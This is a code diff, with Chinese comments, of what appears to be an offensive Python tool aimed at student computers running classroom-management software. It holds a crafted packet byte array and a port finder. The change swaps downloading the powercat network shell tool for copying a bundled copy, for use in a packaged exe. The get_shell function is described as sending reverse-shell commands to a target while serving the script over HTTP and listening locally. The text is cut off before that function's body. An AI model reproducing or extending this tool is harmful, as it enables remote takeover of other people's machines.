@@ -5,7 +5,6 @@ from time import sleep
 from subprocess import Popen, PIPE
 from re import compile
 import os
-import urllib.request
 
 store = [[0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x9e, 0x03, 0x00, 0x00, 0x10, 0x41, 0xaf, 0xfb, 0xa0, 0xe7, 0x52, 0x40, 0x91,
           0xdc, 0x27, 0xa3, 0xb6, 0xf9, 0x29, 0x2e, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81, 0x91, 0x03, 0x00, 0x00, 0x91, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
@@ -155,25 +154,41 @@ def find_student_ports():
         return []
 
 def prepare_powercat():
-    """自动下载 powercat.ps1 到本地 p.ps1，若本地已存在则跳过"""
-    if os.path.exists("p.ps1"):
-        logger("[+] 本地已存在 p.ps1，跳过下载")
+    """检查并准备 p.ps1 到当前工作目录（支持 PyInstaller 打包）"""
+    import sys
+    import os
+    import shutil
+
+    # 获取程序运行目录（兼容打包）
+    if getattr(sys, 'frozen', False):
+        base_dir = sys._MEIPASS
+    else:
+        base_dir = os.path.dirname(os.path.abspath(__file__))
+
+    src_file = os.path.join(base_dir, "p.ps1")
+    dst_file = os.path.join(os.getcwd(), "p.ps1")
+
+    if os.path.exists(dst_file):
+        logger("[+] 当前目录已存在 p.ps1")
         return True
 
-    try:
-        # 从官方仓库下载 powercat.ps1
-        url = "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1"
-        logger("[*] 正在下载 powercat.ps1 ...")
-        urllib.request.urlretrieve(url, "p.ps1")
-        logger("[+] powercat.ps1 下载成功，已保存为 p.ps1")
-        return True
-    except Exception as e:
-        logger("[-] 下载 powercat.ps1 失败: " + str(e))
-        logger("[!] 请手动将 powercat.ps1 放入当前目录并重命名为 p.ps1")
+    if os.path.exists(src_file):
+        try:
+            shutil.copy2(src_file, dst_file)
+            logger("[+] 已从打包目录复制 p.ps1 到当前目录")
+            return True
+        except Exception as e:
+            logger("[-] 复制 p.ps1 失败: " + str(e))
+            return False
+    else:
+        logger("[-] 未找到 p.ps1，请确保该文件在程序目录或打包资源中")
         return False
-
 # 反弹shell
 def get_shell(target_ip, local_ip=None):
+    # 【新增】切换到 exe 所在目录（打包后确保 HTTP 能访问 p.ps1）
+    import sys
+    if getattr(sys, 'frozen', False):
+        os.chdir(os.path.dirname(sys.executable))
     """
     向目标发送反弹shell命令
     自动准备 p.ps1，启动 HTTP 服务器，并启动本地监听器
